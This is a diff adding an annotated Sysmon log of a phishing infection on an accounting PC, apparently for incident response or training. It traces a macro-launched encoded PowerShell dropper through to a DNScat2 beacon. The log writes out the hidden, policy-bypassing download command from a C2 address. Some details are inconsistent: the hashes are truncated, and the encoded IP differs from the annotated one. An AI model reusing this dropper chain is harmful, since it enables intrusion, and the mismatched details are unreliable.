@@ -1,0 +1,155 @@
+# Sysmon Process Creation Log — Sanitized
+# Host: ACCOUNTING-PC-09 | User: patricia
+# EventID: 1 (Process Creation)
+# Window: 2024-04-02 09:43:01 UTC to 2024-04-02 11:02:00 UTC
+# Source: Windows Event Log → Sysmon
+# -----------------------------------------------------------------------
+#
+# FORMAT PER ENTRY:
+#   [TIMESTAMP UTC]
+#   EventID     : Sysmon Event ID
+#   PID         : Process ID
+#   PPID        : Parent Process ID
+#   Image       : Full path of spawned process
+#   ParentImage : Full path of parent process
+#   CommandLine : Full command line arguments
+#   User        : Executing user context
+#   Hashes      : MD5,SHA256 of the executable
+#   Note        : Analyst annotation
+# -----------------------------------------------------------------------
+
+
+# ===================================================================
+# STAGE 1 — INITIAL INFECTION (Word macro executes)
+# ===================================================================
+
+[2024-04-02 09:43:01 UTC]
+EventID     : 1
+PID         : 3812
+PPID        : 2204
+Image       : C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+ParentImage : C:\Windows\explorer.exe
+CommandLine : "WINWORD.EXE" /n "C:\Users\patricia\Downloads\Q1_Invoices_Final.docm"
+User        : CORP\patricia
+Hashes      : MD5=legitimate,SHA256=legitimate
+Note        : patricia double-clicked the phishing attachment from her Downloads folder
+
+
+[2024-04-02 09:43:07 UTC]
+EventID     : 1
+PID         : 4104
+PPID        : 3812
+Image       : C:\Windows\System32\cmd.exe
+ParentImage : C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+CommandLine : cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA4ADMALgAyADAAMwAuADEAMQAzAC4AOAA4ADoAOAAwADgAMAAvAHMAdgBjAHUAcABkAGEAdABlAC4AZQB4AGUAIAB...
+User        : CORP\patricia
+Hashes      : MD5=legitimate,SHA256=legitimate
+Note        : ⚠️ WINWORD spawning cmd.exe is anomalous — VBA macro triggered
+              Encoded PowerShell: Invoke-WebRequest -Uri http://203.0.113.88:8080/svcupdate.exe
+              -OutFile C:\Users\patricia\AppData\Roaming\Microsoft\Windows\svcupdate.exe
+
+
+[2024-04-02 09:43:08 UTC]
+EventID     : 1
+PID         : 4216
+PPID        : 4104
+Image       : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentImage : C:\Windows\System32\cmd.exe
+CommandLine : powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0...
+User        : CORP\patricia
+Hashes      : MD5=legitimate,SHA256=legitimate
+Note        : ⚠️ Hidden PowerShell with -EncodedCommand — classic dropper pattern
+              Decoded: downloads svcupdate.exe from attacker C2 to AppData
+
+
+# ===================================================================
+# STAGE 2 — MALWARE EXECUTION (svcupdate.exe starts beaconing)
+# ===================================================================
+
+[2024-04-02 09:43:11 UTC]
+EventID     : 1
+PID         : 4821
+PPID        : 4216
+Image       : C:\Users\patricia\AppData\Roaming\Microsoft\Windows\svcupdate.exe
+ParentImage : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine : "C:\Users\patricia\AppData\Roaming\Microsoft\Windows\svcupdate.exe"
+User        : CORP\patricia
+Hashes      : MD5=c1d2e3f4a5b6789012abcdef34567890,SHA256=cafebabe1234567890abcdef9876fedc
+Note        : ⚠️ MALWARE EXECUTED — svcupdate.exe dropped and launched by PowerShell
+              VirusTotal: 61/72 — DNScat2 client
+              DNS beaconing to updates-cdn77.com begins immediately after launch
+
+
+# ===================================================================
+# STAGE 3 — DNS BEACONING (network activity from svcupdate.exe)
+# ===================================================================
+# Note: Sysmon EventID 22 (DNS Query) entries for svcupdate.exe
+# Shown here for completeness alongside process tree
+
+[2024-04-02 09:43:17 UTC]
+EventID     : 22
+PID         : 4821
+Image       : C:\Users\patricia\AppData\Roaming\Microsoft\Windows\svcupdate.exe
+QueryName   : a7f3k2.updates-cdn77.com
+QueryStatus : 9003 (DNS_ERROR_RCODE_NAME_ERROR / NXDOMAIN)
+Note        : First DNS beacon — confirms malware is active
+
+[2024-04-02 09:43:23 UTC]
+EventID     : 22
+PID         : 4821
+Image       : C:\Users\patricia\AppData\Roaming\Microsoft\Windows\svcupdate.exe
+QueryName   : bx92mq.updates-cdn77.com
+QueryStatus : 9003
+
+[2024-04-02 09:43:29 UTC]
+EventID     : 22
+PID         : 4821
+Image       : C:\Users\patricia\AppData\Roaming\Microsoft\Windows\svcupdate.exe
+QueryName   : zt18rp.updates-cdn77.com
+QueryStatus : 9003
+
+# [... 844 additional EventID 22 entries truncated — same pattern ...]
+
+
+# ===================================================================
+# FULL PROCESS TREE SUMMARY (Visual)
+# ===================================================================
+#
+#  explorer.exe (CORP\patricia)
+#  └── WINWORD.EXE  [PID 3812]
+#      "Q1_Invoices_Final.docm"           ← phishing doc opened
+#      └── cmd.exe  [PID 4104]            ← ⚠️ Word spawning cmd = macro
+#          /c powershell.exe -Hidden -Encoded ...
+#          └── powershell.exe  [PID 4216] ← ⚠️ encoded dropper
+#              Invoke-WebRequest → downloads svcupdate.exe
+#              └── svcupdate.exe  [PID 4821]  ← ⚠️ MALWARE
+#                  DNScat2 beacon to updates-cdn77.com
+#                  DNS queries every 6 seconds (847 total)
+#                  Base64 exfil via TXT records (18 queries)
+
+
+# ===================================================================
+# PROCESS STATISTICS
+# ===================================================================
+
+Metric                              Value
+----------------------------------  ---------------------------
+WINWORD.EXE spawn count (cmd.exe)   1 (anomalous — should be 0)
+cmd.exe → powershell (hidden)       1
+PowerShell -EncodedCommand count    1
+svcupdate.exe instances             1  (PID 4821)
+DNS queries from svcupdate.exe      847
+Malware persistence mechanism       None detected in process logs
+                                    (see iocs.txt — no Run key found on
+                                    this host; malware runs in session only)
+
+
+# -----------------------------------------------------------------------
+# ANALYST NOTES:
+# - Word spawning cmd.exe is a high-confidence indicator of macro execution
+# - -WindowStyle Hidden + -ExecutionPolicy Bypass = standard dropper flags
+# - Encoded PowerShell should always be decoded and reviewed
+# - svcupdate.exe hashes match DNScat2 client on VirusTotal (61/72 engines)
+# - No persistence on ACCOUNTING-PC-09 — malware lives only in running session
+# - Killing svcupdate.exe (PID 4821) and isolating host stops the beaconing
+# -----------------------------------------------------------------------
